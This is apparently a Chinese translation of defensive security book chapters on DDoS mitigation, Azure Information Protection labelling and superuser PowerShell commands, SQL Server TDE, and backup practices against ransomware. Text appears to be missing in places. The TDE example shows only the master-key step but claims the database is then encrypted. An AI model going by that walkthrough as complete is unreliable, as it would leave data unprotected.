  \ – 表示，五分之一经历过 DDoS 攻击的调查受访者报告称他们遭受了勒索 DDoS 攻击或其他威胁。\n\n对于大多数公司来说，DDoS 攻击只是一种麻烦，除了公共网站的一些服务中断外几乎没有造成损害。然而，对于主要收入来自电子商务的其他公司来说，DDoS\
  \ 攻击可能意味着他们的网站宕机每小时都会造成大量收入损失。\n\nDDoS 攻击通常分为三个不同级别：\n\n- **第 4 层 DDoS 攻击**（TCP\
  \ **同步 (SYNC)** 洪水或 **用户数据报协议 (UDP)** 洪水） – SYN 洪水（或 TCP SYN 洪水）是一种针对 TCP 连接建立过程的\
  \ DDoS 攻击类型。攻击者向目标服务器发送大量 TCP SYN 数据包，并使用伪造的源 IP 地址。服务器以 **同步-确认 (SYN-ACK)** 数据包进行响应，但攻击者从未通过发送\
  \ ACK 数据包来完成握手。这导致服务器将不完整的连接保持在 *半开* 状态，称为 **SYN 队列**。如果服务器收到大量 SYN 数据包，它可能会耗尽资源，无法处理合法连接。UDP\
  \ 洪水是一种针对 UDP 的 DDoS 攻击类型。攻击者向目标服务器的随机端口发送大量 UDP 数据包，这可能导致服务器消耗大量带宽和处理能力。由于 UDP\
  \ 是无连接协议，服务器在发送或接收数据之前无需建立连接，因此攻击可以用最少的资源发起。UDP 洪水可用于使目标服务器过载，导致其崩溃或不可用。\n- **第\
  \ 7 层 DDoS 攻击**（HTTP GET/POST 洪水） – 它们也被称为应用层攻击。第 7 层攻击通常更难检测，因为它们试图模仿普通终端用户。此外，由于它们消耗服务器资源以及网络资源，因此也更有效。然而，第\
  \ 7 层攻击需要实际的 IP 地址，因为它们不适用于伪造地址。\n- **放大攻击**（例如使用 DTLS 协议，我之前在我的网站上写过这里 – https://msandbu.org/rdp-ddos-amplification-attack/）\
  \ – 简而言之，它们让目标使用特制的数据包和协议栈中的漏洞对自身进行 DDoS 攻击。\n\n前两种攻击旨在仅用流量使服务过载，直到服务无法处理负载为止。TCP\
  \ SYN 洪水利用 TCP 三次握手 — 它通过向目标发送大量 TCP SYN 数据包来实现，源 IP 地址也可能是伪造的 IP 地址。\n\n虽然许多防火墙和\
  \ **应用交付控制器 (ADC)** 具有内置的保护方法来防御这些类型的攻击，使用名为 TCP SYN cookie 的功能，但它们仍需要处理初始数据包。\n\
  \n在 2022 年，一个名为 Killnet 的俄罗斯关联网络犯罪团伙还针对挪威和立陶宛的多个组织和公共服务，使服务在数小时内不可用。虽然攻击时间不长，但它对本地网络的影响很长，其中导致本地网络设备（如交换机）的流表饱和，以及数据包转发能力的破坏。因此，它也可能影响托管网站的其他内部服务。\n\
  \n\n\n\n\nKillnet 的攻击模式根据目标网站的位置分为第 4 层和第 7 层。如果网站托管在公有云中，Killnet 就会使用基于第 7 层的攻击；但对于不在公有云中的目标，他们会使用基于第\
  \ 4 层的攻击。\n\n他们之所以避免对使用 AWS 等公有云的目标发起基于第 4 层的攻击，原因之一是 AWS 默认启用了针对第 4 层攻击的 DDoS 防护。AWS\
  \ 等大型提供商内置了 DDoS 防护机制，可以在边缘保护入站流量，使流量不会到达实际的客户服务。\n\n这些攻击通常通过大量机器人（也称为僵尸或代理）发起，这些机器人通常是被攻击者远程控制的受感染计算机或设备。这些机器人由一台主服务器控制，该服务器是一个集中式服务器，负责协调僵尸网络中所有机器人的行动。主服务器向机器人发送命令，指示它们对特定目标发起攻击。这样一来，攻击者就能以极少的资源发动大规模\
  \ DDoS 攻击，因为攻击分布在多个机器人上。使用机器人和主服务器会使检测和缓解 DDoS 攻击变得困难，因为攻击源分布在多台受感染的设备上，并且由中心统一控制。\n\
  \nAzure 和 Google Cloud 也有类似的机制和功能，但默认并未启用。此外，我们还有 Cloudflare 和 Akamai 等选项，它们也使用\
  \ DDoS 防护机制。\n\n对于较小的公司，我建议考虑 Cloudflare，因为他们的 SKU 更便宜，而且实现起来很简单，可以抵御基于第 4 层的 DDoS\
  \ 攻击。无论你选择 Cloudflare 还是其他提供商，在大多数情况下，你都不需要将实际网站托管在那里。使用 Cloudflare 时，你只需设置一个新的公共地址，并将\
  \ DNS 记录指向新的 Cloudflare IP，Cloudflare 就会充当反向代理，直接或通过名为 Argo Smart Routing 的功能连接到后端——也就是你的\
  \ Web 服务器。\n\n至于第 7 层攻击，如前所述，它们更难与正常流量区分开来，因为僵尸网络中的每个机器人都会发出看似合法的网络请求，这表明流量并非伪造，来源也可能看起来正常。\n\
  \n有时，这些攻击会直接使用 HTTP GET 请求访问网站的主 URL；有时则使用 HTTP POST，因为这要求 Web 服务器处理该进程，从而消耗更多资源。\n\
  \n现在，有一些方法可以阻止这类攻击，我接下来会提到，但它们要求你在服务前面部署某种形式的第 7 层防火墙，例如带有 Web 应用程序防火墙（WAF）的 Microsoft\
  \ Azure Application Gateway、AWS 的 CloudFront 或 Cloudflare：\n\n- **用户代理阻止**：在大多数情况下，自动化攻击会使用僵尸网络上的脚本触发，因此不会有常规的\
  \ HTTP 用户代理，如下面的截图所示。因此，让 WAF 能够根据未知用户代理阻止攻击，可能是阻止入站攻击或网页抓取的一个良好起点。我们可以从针对我网站流量的日志中看到这一点：一个基于\
  \ Python 的脚本用户代理正在抓取我的网站信息：\n\n  | 字段 | 值 |\n  | --- | --- |\n  | HTTP 版本 | HTTP/1.1\
  \ |\n  | 主机 | msandbu.org |\n  | 路径 | /azure-vm-guest-agent/ |\n  | 查询字符串 | 空查询字符串\
  \ |\n  | 用户代理 | python-requests/2.27.1 |\n\n  图 6.10 – 用户代理活动日志\n\n- **地理封锁**：大多数\
  \ WAF 提供商还可以根据来源国家/地区阻止 IP 段，如果你的业务仅在特定国家/地区运营，那么无论如何都应该这样做。你应该检查防火墙日志，并在没有合乎逻辑的理由让某些国家/地区访问你的站点时阻止它们。然而，在处理\
  \ DDoS 攻击时，大多数情况下僵尸网络跨越许多不同的国家/地区，这使得维护变得困难，并且可能误封合法用户所在的国家/地区。\n\n- **WAF 签名**：大多数\
  \ WAF 厂商会根据内置签名或自定义规则进行阻止。内置签名用于阻止已知的攻击模式，例如 OWASP TOP 10。例如，你可以在这里阅读 Microsoft\
  \ 为其 WAF 功能提供的签名文件：https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-crs-rulegroups-rules?tabs=owasp32。同样，问题是此功能无法阻止第\
  \ 7 层的常规 DDoS 攻击，因为攻击模式可能只是一个简单的 Web 请求，而且攻击看起来就像普通用户流量。因此，在不影响实际最终用户的情况下很难阻止来自攻击的流量。\n\
  \n- **速率限制**：减少 HTTP DDoS 攻击影响的最常见方法是添加速率限制。这允许我们在网站上定义阈值。假设有人每秒发送超过 100 个请求——我们可以对其流量实施\
  \ QoS 检查，或者完全阻止它。许多厂商还实施了 **JavaScript (JS)** 质询，这意味着一旦达到阈值，服务就会向他们发送一个 JS 质询（只是一个小型\
  \ JS 脚本），他们需要在发出请求的端点上运行该脚本。如前所述，DDoS 攻击通常由无法解析 JS 质询的脚本触发，因此这些脚本无法通过质询并被阻止。使用浏览器的合法\
  \ Web 用户可以运行并处理 JavaScript 质询，因此不会被阻止。\n\n当使用 Microsoft Azure 托管你的 Web 服务时，Application\
  \ Gateway 中的 WAF 功能不包含速率限制能力。要在 Azure 中实现速率限制，可以使用 Azure Front Door 服务，如下面的图所示。Azure\
  \ Front Door 允许你创建自定义规则，包括速率限制规则，这些规则将应用于所有访问你网站的用户。需要注意的是，该规则应配置为匹配你网站的主机名：\n\n\
  ![](img/7b49a27a3c2adc52d097f2e77f3bf394_201_0.png)\n\n图 6.11 – Azure Front Door\
  \ 和速率限制\n\n我们可以看到，基于 DDoS 的勒索软件攻击已变得更加普遍。幸运的是，对于使用公有云或其他公共 DDoS 防护机制（如 Cloudflare\
  \ 或 Akamai）的客户来说，DDoS 攻击的影响有限，因为这些机制拥有庞大的基础设施和处理流量的方式。\n\n虽然 DDoS 攻击可能只是令人烦恼，但它们也可能对特定行业和基础设施产生重大影响。因此，了解你可以使用哪些选项来最大限度地降低\
  \ DDoS 攻击影响你业务的风险非常重要。\n\n## 总结\n\n在本章中，我们了解了 ZTNA 技术以及该生态系统中的一些厂商，以及如何使用这些服务安全地将内部服务发布给最终用户以降低勒索软件风险。然后，我们探讨了一些安全访问管理解决方案的方法，使用内置工具和第三方选项来管理基于\
  \ Windows 的基础设施。\n\n然后，我们讨论了 DDoS 趋势、DDoS 攻击如何影响企业，以及我们如何在不同层面保护自己免受 DDoS 攻击。\n\n\
  最后，我们讨论了网络分段，以及如何对网络进行分段以降低攻击者横向移动可能性的一些常见最佳实践。\n\n尽管在本章中我们重点讨论了安全发布服务，但攻击仍然可能发生。因此，能够保护数据也很重要，这样即使攻击者成功窃取数据，也无法直接看到数据。在下一章中，我们将重点讨论可以使用哪些服务和方法来加密和保护我们的数据。\n"
- "## 使用 Azure 信息保护和数据保护保护信息\n\n近年来，大多数勒索软件攻击已从仅加密数据转变为既加密又窃取数据。原因是大多数公司意识到他们只需要从备份中恢复加密文件，这意味着勒索软件组织不会得到任何付款。因此，为了增加获得付款的可能性，勒索软件组织开始窃取他们能找到的任何数据。\n\
  \n在本章中，我们将了解如何使用服务来加密数据以降低数据落入错误之手的风险。我们将仔细研究 Windows 和 Azure 信息保护（AIP）中的一些内置服务，最后介绍一些与数据保护和备份相关的常见最佳实践。\n\
  \n在本章中，我们将介绍以下主题：\n\n- 为什么要对数据进行分类和加密\n- AIP 概述\n- DLP 功能与 AIP 的未来\n- 基于 SQL 的工作负载加密\n\
  - 数据保护和备份的最佳实践\n\n### 技术要求\n\n在本章中，我们将使用 AIP 的功能来介绍 Microsoft E5 的一些功能。如果你在前面的章节中注册了试用许可证，那么你已经可以使用我们将在本章中介绍的功能。\n\
  \n\n\n\n如果您还没有注册，可以使用此链接注册 E5 试用版：https://go.microsoft.com/fwlink/p/?LinkID=2188847&clcid=0x409&culture=en-us&country=US.\n\
  \n## 数据外泄\n\n想象一下，你登录到自己的计算机或管理服务器，却发现系统已被加密，桌面上有一封勒索信，声称你的数据已被窃取。随后，你收到通知，如果不支付赎金，你的所有数据将被公开在网上。这些数据可能包含机密信息。2020年，芬兰一家名为\
  \ Vastaamo 的私人心理治疗服务提供商的病人数据库遭到黑客攻击，并被泄露到暗网。该病人数据库包含3万名患者的病历记录，这些信息随后被用来直接敲诈服务提供商和患者本人。\n\
  \n在过去两年中，我们看到大多数勒索软件攻击都采用这种策略。在撰写本书时，最新的攻击之一是针对思科（Cisco）的。攻击者声称他们在2022年6月的一次攻击中窃取了2.8\
  \ GB的数据。\n\n此外，像埃森哲（Accenture）这样的公司在2021年8月也受到了 LockBit 攻击的影响，攻击者团伙声称窃取了6 TB的数据。攻击者还建立了一个反向拍卖网站，如下图所示：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_204_0.png)\n\n图 7.1 – LockBit 泄露数据页面\n\
  \n虽然转储中包含的数据似乎大部分来自 PowerPoint 和案例研究，但这表明即使是大型企业也可能没有适当的安全机制，因此确保数据受到保护非常重要，以防有人设法访问你的数据。\n\
  \n由于文件服务器或 OneDrive、Google Drive、SharePoint 甚至 SQL Server 中存储的大多数文件默认情况下并未加密，如果有人设法访问存储在那里的文件，他们可以直接打开它们。\n\
  \n## 数据分类\n\n关键问题是，我们应该加密所有数据吗？我们能加密所有数据吗？是否所有数据都应使用相同的加密方法进行加密？\n\n这就是数据分类发挥作用的地方，当我们开始进入\
  \ AIP 时，它也将发挥作用。数据分类可以定义为按类别组织数据的过程，从而使其更容易被使用并得到更有效的保护。\n\n虽然我们不会在本书中深入介绍这一点，但我们将在这里进行一个高层次的概述。\n\
  \n我们可以将组织中的所有数据分为三个不同的敏感度级别：\n\n- **低敏感度**：公共网站、新闻稿\n- **中敏感度**：不含机密数据的电子邮件和文档\n\
  - **高敏感度**：财务记录、知识产权\n\n我们可能有一些低敏感度的信息，这些信息应该对公众开放，因此，为了让公众能够直接阅读内容，这些信息不应加密。默认情况下，电子邮件不加密，电子邮件中发送的附件也不加密。\n\
  \n然后，我们有高度敏感的文档，例如财务记录或个人信息，如患者病历，这些是我们想要保护的数据。\n\n我们如何根据敏感度级别对这些数据进行分类？我们可以采用三种主要方法：\n\
  \n- **基于内容**：基于内容的分类是一个评估数据内容并根据评估结果对数据进行分类的过程。例如，如果文件包含个人信息（如社会安全号码），则会被归类为高度敏感。这种类型的分类通常由分类软件处理，该软件扫描内容以查找特定模式，并在找到匹配项时相应地对数据进行分类。\n\
  - **基于上下文**：当数据由某些软件生成时（例如财务数据或人力资源系统），数据应自动分类为高度敏感。例如，如果你有一个使用后端数据库的人力资源系统，该系统上的所有内容都应定义为高度机密。这通常通过手动方式完成，即在数据级别启用加密，或者由软件自动为数据添加敏感度级别。\n\
  - **基于用户**：这是指处理数据的用户决定如何对其进行分类。如果用户知道某些文档包含高度敏感的信息，他们应该能够在数据上定义相应的级别。\n\n通常，你会使用所有这些方法，因为某些数据需要用户交互，而其他数据将根据生成数据的系统自动分类。\n\
  \n## Azure 信息保护\n\n对数据进行分类是保护数据的第一步；然而，它并不会自动加密数据。因此，你需要一个能够根据数据上已定义的敏感度标签来加密数据的产品/服务。\n\
  \n虽然市场上有许多产品具备这种能力，但我们将重点介绍微软的一项服务，称为 **Azure 信息保护**。\n\nAIP 具有广泛的功能；它包括一个可安装在最终用户机器上的标签客户端，该客户端已集成到文件资源管理器和\
  \ Office 应用程序中。这意味着用户可以自动标记文件和数据，然后客户端可以自动加密这些文件和数据。\n\nAIP 还有一个本地文件扫描器，可用于扫描网络和文件共享中的敏感内容，并根据已定义的策略自动应用分类和保护标签。\n\
  \n> **注意**\n> \n> AIP 需要使用 Microsoft E5 或 Azure AD P2 许可证。根据你所拥有的许可证类型，功能级别也有所不同。你可以在此处查看不同的功能和许可证级别：https://docs.microsoft.com/en-us/office365/servicedescriptions/microsoft-365-service-descriptions/microsoft-365-tenantlevel-services-licensing-guidance/microsoft-365-security-compliance-licensing-guidance.\n\
  \n在撰写本书时，AIP 和其他合规性功能已移至名为 Purview 的另一个产品系列下，因此门户名称或我们在 UI 中看到的菜单可能与本书中使用的有所不同。要执行下一步设置一些示例标签，你需要拥有一个\
  \ Azure AD 租户，或者你可以创建一个新租户来使用。\n\n如果你已注册试用版或正在使用现有租户，可以从 Microsoft 365 管理中心内的合规性门户访问\
  \ AIP 功能，你可以在此处找到该门户：https://compliance.microsoft.com/homepage.\n\n## 为标签命名并创建工具提示\n\
  \n你为此标签选择的保护设置将立即应用于其所应用的文件、电子邮件或内容容器。带标签的文件无论保存在何处（无论是保存在云中还是下载到计算机）都将受到保护。\n\n\
  名称 *\n\n输入一个友好名称\n\n显示名称 *\n\n输入显示名称。这是你的用户将在发布该标签的应用中看到的名称。\n\n面向用户的说明 *\n\n输入有助于用户理解此标签用途的文本\n\
  \n面向管理员的说明\n\n输入对管理此标签的管理员有帮助的说明\n\n图 7.3 – AIP 创建新标签\n\n单击“下一步”。现在，我们需要定义标签的范围。如下图所示，我们有三个不同的选项。对于此场景，我们将选择“项目”。\n\
  \n## 定义此标签的范围\n\n标签可以直接应用于文件、电子邮件、SharePoint 网站和 Teams 等容器、Power BI 项目、架构化数据资产等。请告诉我们你希望在哪里使用此标签，以便配置适用的保护设置。了解有关标签范围的更多信息\n\
  \n项目\n为带标签的电子邮件、Office 文件和 Power BI 项目配置保护设置。还可以定义自动标记条件，以自动将此标签应用于 Office 中的敏感内容、Azure\
  \ 中的文件等。\n\n组和网站\n配置隐私、访问控制和其他设置，以保护带标签的 Teams、Microsoft 365 组和 SharePoint 网站。\n\
  要将敏感度标签应用于 Teams、SharePoint 网站和 Microsoft 365 组，必须先完成这些步骤以启用该功能。\n\n架构化数据资产（预览）\n\
  将标签应用于 Microsoft Purview 数据地图中的文件和架构化数据资产。架构化数据资产包括 SQL、Azure SQL、Azure Synapse、Azure\
  \ Cosmos、AWS RDS 等。\n要将此标签应用于架构化数据资产，必须先为 Microsoft Purview 数据地图启用标签功能。你可以从“标签”页面执行此操作。了解有关\
  \ Microsoft Purview 数据地图标签的更多信息\n\n图 7.4 – AIP 标签的范围\n\n\n\n可以将标签分配给以下对象：\n\n- **项目：**\
  \ 这适用于使用 AIP 客户端手动标记的电子邮件、Office 文件和其他非 Office 文件。\n- **组和网站：** 这适用于 Microsoft Teams\
  \ 网站、Microsoft 365 组（原 Office 365 组）和 SharePoint 网站。\n- **架构化数据资产：** 由于此功能处于预览阶段，此链接说明了它适用于哪些类型的数据，因为这些数据可能会变化：`https://docs.microsoft.com/en-us/azure/purview/how-to-automatically-label-your-content#scan-your-data-to-apply-sensitivity-labels-automatically`\n\
  \n接下来，我们可以定义是要应用加密还是使用自定义内容（如页眉、页脚或水印）标记文件。在此示例中，我们选择加密项目，这将为我们提供以下屏幕截图所示的设置。\n\n\
  ![](img/7b49a27a3c2adc52d097f2e77f3bf394_209_0.png)\n\n图 7.5 – AIP 的加密机制\n\n单击**向特定用户和组分配权限**，然后向标签分配权限。在此示例中，如下面的屏幕截图所示，让我们选择**添加组织中的所有用户和组**，然后单击**保存**。\n\
  \n## 分配权限\n\n只有您选择的用户或组才会被授予使用带有此标签的内容的权限。您可以从现有权限（如共同所有者、共同作者和审阅者）中进行选择，或者根据您的需求自定义权限。\n\
  \n- 添加组织中的所有用户和组\n- 添加任何经过身份验证的用户\n- 添加用户或组\n- 添加特定的电子邮件地址或域\n\n0 个项目\n\n图 7.6 –\
  \ 向 AIP 标签分配全局权限\n\n我们可以指定权限，或者允许用户在文件上设置标签时自行分配权限。\n\n在“加密”页面上，您还应该注意另一个设置，即“使用双密钥加密”。默认情况下，存储在\
  \ Office 365 中或使用 AIP 加密的所有内容都使用由 Microsoft 管理的加密密钥。这当然意味着 Microsoft 拥有所有数据的所有密钥。使用双密钥加密，我们可以使用\
  \ Microsoft 的密钥以及我们自己的密钥对数据进行加密。如果启用了此功能，Microsoft 理论上无法访问数据。\n\n双密钥加密需要设置加密 Web\
  \ 服务，以便在加密或解密文件时能够访问该服务。但是，如果您丢失了自己的密钥，那么您将失去对数据的所有访问权限，因此，如果您出于合规性原因计划实施双密钥加密，请确保从知名供应商（如\
  \ Thales）实施双密钥服务。\n\n您还可以指定是否应根据内容自动应用敏感度标签，但我们暂时将其留空。\n\n现在，单击“下一步”和“完成”以保存标签。然后重复同样的操作，将另一个标签命名为“中等”。另外，这里我们不选择“加密项目”，而是选择“应用内容标记”，然后单击“下一步”。然后打开“内容标记”并勾选“添加水印”。然后输入水印文本，如下面的屏幕截图所示：\n\
  \n## 内容标记\n\n- 添加水印\n- 自定义文本\n- 公司敏感\n\n图 7.7 – 在标签上添加水印\n\n然后，单击**下一步**以保存新的策略标签。\n\
  \n既然我们有了两个标签，让我们将它们分组为一个策略并发布给我们的用户。返回合规门户中的**信息保护**菜单，单击**标签策略**，然后选择**发布标签**。\n\
  \n接下来，选择先前创建的现有标签，然后单击**下一步**。此时，您将看到一些自定义选项，如下面的屏幕截图所示。\n\n## 策略设置\n\n为包含在此策略中的标签配置设置。\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_211_0.png)\n\n图 7.8 – 为标签定义高级设置\n\n但是，只需保持设置不选中并单击**下一步**，直到进入向导的最后部分。为策略命名并单击**提交**。\n\
  \n如果尚未选择，您可以在**标签策略**菜单中选择策略，并单击**发布标签**。然后，这些标签将发布到 Office 配置服务，并在接下来的 24 小时内，作为\
  \ Microsoft Office 中的一个选项，对您 Azure AD 租户内的所有用户可用，如下面的屏幕截图所示。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_211_1.png)\n\
  \n图 7.9 – 在 Microsoft Word 中定义标签\n\n如果我们选择**高度敏感**，文档应自动由 AIP 服务加密。如果您在 Microsoft\
  \ Word 中创建两个文档，并将一个文档保存为带高度敏感标签，另一个文档不带任何敏感度标签，您会注意到在其他 Word 阅读器中无法检查带高度敏感标签的文档。\n\
  \n一个有趣的事实是，Word 文件只是压缩的 XML 文件，因此如果您使用 7-Zip 打开 Word 文档，您将看到 Word 文件的内容。在下面的屏幕截图中，您可以看到左侧普通\
  \ Word 文件和右侧加密文件之间的内容差异。\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_212_0.png)\n\
  \n图 7.10 – 使用 7-Zip 检查两个 Word 文件，其中右侧文件已加密\n\n虽然此功能适用于 Microsoft Office 文件和数据，那么非\
  \ Office 文件呢？在这种情况下，我们可以使用 AIP 客户端，您可以从此处下载：`https://www.microsoft.com/en-us/download/details.aspx?id=53018`。\n\
  \n当您安装 AIP 代理时，您将在 Windows 文件资源管理器中使用一些额外功能，如下面的屏幕截图所示。如果您左键单击文件，然后右键单击，您将看到**分类和保护**选项。\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_212_1.png)\n\n图 7.11 – AIP 右键单击扩展功能\n\
  \n在这里，您也会看到与 Microsoft Office 中相同的标签。一旦文件被定义为受保护，您将看到图标位图更改为 AIP 徽标。\n\n如果您在常规 TXT\
  \ 文件上使用此功能，并在加密后尝试打开该 TXT 文件，您将看到内容不再可读。\n\n最后，应该指出的是，如果使用不当，AIP 的功能可能会产生一些不良副作用，例如，如果有用户离开了公司，而他们是对某些文件有访问权限的唯一人员。\n\
  \n幸运的是，在 AIP 中，我们有一个称为超级用户的访问角色，它始终对权限管理服务拥有完全控制权。这意味着他们可以修改对使用 AIP 加密的文件或数据的访问权限。但是，此功能默认未启用，并且不会自动为用户分配该角色。\n\
  \n要将用户添加到超级用户角色，您需要使用 AIP PowerShell 模块。要安装和配置 AIP 超级用户，请在您的计算机上打开 PowerShell，并首先安装以下模块：\n\
  \n```\nInstall-Module -Name AIPService\n```\n\n然后，使用以下 PowerShell 命令向 AIP 服务进行身份验证，该命令将触发一个浏览器窗口，您需要使用在\
  \ Azure AD 租户中具有全局管理员角色的用户进行身份验证：\n\n```\nConnect-AIPService\n```\n\n接下来，使用以下命令启用超级用户功能：\n\
  \n```\nEnable-AipServiceSuperUserFeature\n```\n\n现在，您可以使用以下命令并指定用户的电子邮件地址，将用户添加到超级用户角色。在此示例中，我使用了我的电子邮件地址：\n\
  \n```\nAdd-AipServiceSuperUser -EmailAddress msandbu@msandbu.org\n```\n\n然后，您可以使用以下命令根据文件路径查看文件的分类级别：\n\
  \n```\nGet-AIPFileStatus -path\n```\n\n如下面的屏幕截图所示，我们可以查看存储在桌面文件夹中的所有文件的 AIP 状态。这还包括标签状态，以及文件是否在\
  \ IsRMSProtected 属性下使用 AIP 进行保护：\n\n\n\n\nFigure 7.12 – 查看文件的分类\n\n接下来，使用以下命令移除文件的保护机制：\n\
  \n```\nSet-AIPFileLabel C:\\locationofthefile -RemoveProtection\n```\n\n你也可以使用 PowerShell\
  \ 命令在需要时移除标签、更改标签或批量移除文件的保护。只要记住，在完成移除或更改文件后，你应该使用以下 PowerShell 命令禁用超级用户功能：\n\n\
  ```\nDisable-AipServiceSuperUserFeature\n```\n\n使用 AIP 是对数据进行分类和加密的一种方式。这可确保攻击者无法查看数据，并降低知识产权落入错误人之手的风险。\n\
  \n需要注意的是，使用此功能需要适当的终端用户培训，并且该功能适用于常规终端用户文件，但不适用于由应用程序或服务器基础设施使用的文件。\n\n我们在这本书中尚未涉及的最后一件事是使用\
  \ Microsoft Defender for Cloud Apps 及其与 AIP 的集成。\n\nMicrosoft Defender for Cloud\
  \ Apps 允许从 AIP 自动应用敏感性标签。这些标签可以在 Cloud Apps 中作为治理操作应用于文件，并且也可以根据标签的配置自动加密文件以提供额外的安全性。\n\
  \n并非在你使用第三方应用程序使用 SQL Server 的情况下。在我个人的经验中，很少有应用程序或应用程序供应商支持或测试过 Always Encrypted。使用\
  \ TDE，数据的加密和解密由数据库系统处理，并且加密过程对应用程序是透明的，这意味着应用程序无需专门设计来处理数据的加密和解密。\n\n在此链接中，你可以找到使用\
  \ TDE 与 SharePoint 结合的示例：https://social.technet.microsoft.com/wiki/contents/articles/34201.configuring-tde-in-sharepoint-content-databases.aspx。\n\
  \nTDE 不加密实时通信流，如果攻击者设法获得对 SQL Server 实例的访问权限并知道如何登录 SQL 服务和管理工具，他们可以使用查询对数据进行操作然后将其导出。然而，攻击者更感兴趣的是转储数据库文件并将其导出到外部位置，因为他们希望尽快进出。现在，如果主数据库文件（MDF）使用\
  \ TDE 加密并且有人设法将其导出，他们将无法读取内容。\n\nTDE 对数据和日志文件进行实时 I/O 加密和解密，而不会产生太多性能开销。据估计，TDE\
  \ 使用的 CPU 增加在 3% 到 5% 之间；然而，如果大部分数据缓存在内存中，则可能更低。\n\n那么，TDE 如何帮助抵御勒索软件攻击？如果攻击者设法访问\
  \ SQL 数据库，他们将无法在没有加密密钥的情况下打开文件。如果他们尝试在 SQL Server 之外打开数据库，他们会收到此错误消息：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_216_0.png)\n\
  \nFigure 7.13 – 打开 TDE 加密的数据库\n\n以下是如何在现有数据库上使用自签名证书启用 TDE 的快速示例。需要注意的是，使用自签名证书并不是最佳实践，而且在设置\
  \ TDE 时使用外部密钥管理系统时你有一些选择，例如以下内容：\n\n- Azure Key Vault with SQL Connector：Azure Key\
  \ Vault 集成仅适用于 SQL Server 的 Enterprise、Developer 和 Evaluation 版本。从 SQL Server 2019\
  \ 开始，Standard 版本也受支持。\n- **HashiCorp Vault with Key Management for SQL Server：**\
  \ 这需要 HashiCorp Vault 的 Enterprise 版本。\n\n为 SQL Server 设置 TDE 需要你拥有一个数字证书，该证书将被导入到用于读取/写入数据库的\
  \ SQL Server 实例中。\n\n> **Note**\n> 此设置的完成应使用官方 PKI 服务或使用前面提到的一些功能来提供证书生命周期管理。\n\n\
  为此，我们将使用以下命令使用 PowerShell 生成自签名证书：\n\n```\nNew-SelfSignedCertificate -Subject sqlserver.local\n\
  ```\n\n这将创建一个自签名证书，该证书存储在 SQL Server 上的本地证书存储中。接下来，你需要在 SQL Server 上安装 SQL Server\
  \ Management Studio 或 Azure Data Studio 工具以供使用。需要注意的是，TDE 需要在生产环境中启用 Enterprise\
  \ 版本，但在 Evaluation 和 Developer 版本上也有效。\n\n当你在 SQL Server 上打开管理工具时，你首先需要在系统数据库上运行以下命令：\n\
  \n```\nUSE [master];\nGO\nCREATE MASTER KEY ENCRYPTION BY PASSWORD = 'somePassword';\n\
  GO\n```\n\n完成此操作后，数据库将使用 TDE 进行静态加密。这意味着只有本地数据库服务器才能读取/写入数据库内容。在大多数勒索软件案例中，攻击者会尝试停止具有\
  \ NTFS 文件锁的服务，例如 SQL Server 服务，如果他们尝试复制出数据库文件，他们将无法读取内容。\n\n这是锁定对 Microsoft SQL\
  \ 数据库访问的一种方式，这些数据库在大多数企业中常用，这将使我们能够确保在数据外泄的情况下，攻击者将无法直接访问内容。\n\n## 备份和数据保护的最佳实践\n\
  \n在勒索软件攻击发生时，最重要的事情之一就是拥有数据的备份。这可以确保在需要时能够快速恢复关键系统和数据。不幸的是，我们见过勒索软件攻击者也设法加密存储在备份服务器上的数据，包括异地备份的情况，因为两个数据位置都很容易从主网络访问，并且作为\
  \ SMB 共享可用。\n\n虽然有许多不同的备份产品和供应商，但有一些通用的最佳实践，你应该遵循以保护备份免受勒索软件攻击：\n\n- 遵循备份的 3-2-1\
  \ 规则，这意味着你有三份数据副本，跨越两种不同的介质，可以是磁盘和磁带或磁盘和基于云的备份。最后，将一份数据副本放在异地。\n- 确保你的备份服务器不能直接从你的主环境访问；将其保留在单独的管理域中。如果可能，确保你的备份服务器不能直接从虚拟化层访问。曾有案例显示攻击者能够通过\
  \ vSphere Client 访问备份服务器。\n- 确保你的备份数据可以存储在超高韧性的介质上。我们也见过备份数据被加密的情况，因为数据存储在常规 Windows\
  \ 文件服务器上。如今大多数备份供应商都支持使用不可变备份，这意味着一旦备份数据写入后，就无法修改。例如，Veeam Backup & Replication\
  \ 具有 hardened repositories 功能，其中数据存储在 Linux 文件服务器上使用 XFS 文件系统，或者你也可以使用云服务，如 S3 对象存储。\n\
  - 让备份服务与 AD 域断开连接也有助于降低备份服务器在攻击者设法入侵你的 AD 时受影响的风险。\n- 确保你在备份作业上启用加密。这可确保如果有人设法访问备份数据，他们将无法读取加密的数据。\n\
  - 最后，定期检查备份的状态并确认它们已成功执行至关重要。此外，验证备份文件的完整性以确保在灾难发生时数据可以正确恢复也至关重要。为此，你可以使用各种工具，例如校验和或文件比较软件，来验证备份文件是否与原始数据匹配。还建议定期执行测试恢复，以确保在紧急情况下备份文件可以成功恢复。\n\
  \n关于检查备份状态，许多供应商都内置了备份验证功能。许多这些备份产品可以根据备份数据在隔离网络中自动启动虚拟机并运行测试以验证数据的完整性。\n\n## Summary\n\
  \n在本章中，我们学习了如何配置和使用 AIP 来对数据进行分类和加密，以最大程度地降低恶意行为者访问信息的风险。\n\n我们还研究了使用其他功能来加密其他数据源，例如\
  \ SQL Server 和文件服务器。\n\n\n\n\n"
- '## 第 3 部分：假设已被入侵


  本部分介绍在遭受攻击时我们可以采取的措施，其中最重要的是监控威胁态势。本部分涵盖可用于监控攻击面并收集新威胁信息的不同工具和服务。


  最后，我们将深入探讨与保护 Windows 免受勒索软件攻击相关的最佳实践。


  本部分包含以下章节：


  - *第 8 章，勒索软件取证*

  - *第 9 章，监控威胁态势*

  - *第 10 章，保护 Windows 免受勒索软件攻击的最佳实践*

  '
- "### 勒索软件取证\n\n无论设置了多少防御措施，或安全边界有多先进，我们都不可能 100% 免受网络攻击。因此，始终重要的是：一旦遭到攻击，要知道该怎么做，并尝试通过事后审查来弄清楚攻击是如何发生的。\n\
  \n许多曾遭受勒索软件攻击并支付了赎金的组织，在初次攻击后仅几周就再次遭到攻击，因为他们无法封堵漏洞或实施适当的防御措施。\n\n在本章中，我们将涵盖以下主题：\n\
